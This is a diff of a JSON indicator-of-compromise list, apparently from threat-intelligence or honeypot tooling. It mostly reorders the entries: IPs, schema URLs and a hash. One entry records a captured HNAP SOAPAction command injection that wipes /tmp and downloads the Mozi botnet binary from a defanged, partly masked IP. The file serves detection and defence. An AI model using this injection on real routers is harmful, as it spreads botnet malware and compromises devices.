@@ -1,15 +1,9 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "119.185.240.XXX"
-  },
-  {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "190.179.128.XXX"
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://schemas[.]xmlsoap[.]org/soap/envelope/"
   },
   {
     "context": "Embedded URL in inbound payload",
@@ -27,7 +21,7 @@
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://schemas[.]xmlsoap[.]org/soap/envelope/"
+    "value": "hxxp://www[.]w3[.]org/2001/XMLSchema-instance"
   },
   {
     "context": "Embedded URL in inbound payload",
@@ -36,21 +30,27 @@
     "value": "hxxp://www[.]w3[.]org/2001/XMLSchema"
   },
   {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://www[.]w3[.]org/2001/XMLSchema-instance"
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "119.185.240.XXX"
   },
   {
-    "context": "Inbound payload hash (unknown)",
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "73eac8c443e656efaff989d147c7f3613bff1f9c3e96971fceb8a9025fcf0e44"
+    "type": "ip",
+    "value": "190.179.128.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://119.185.240.XXX:55578/Mozi.m && chmod 777"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "73eac8c443e656efaff989d147c7f3613bff1f9c3e96971fceb8a9025fcf0e44"
   }
 ]
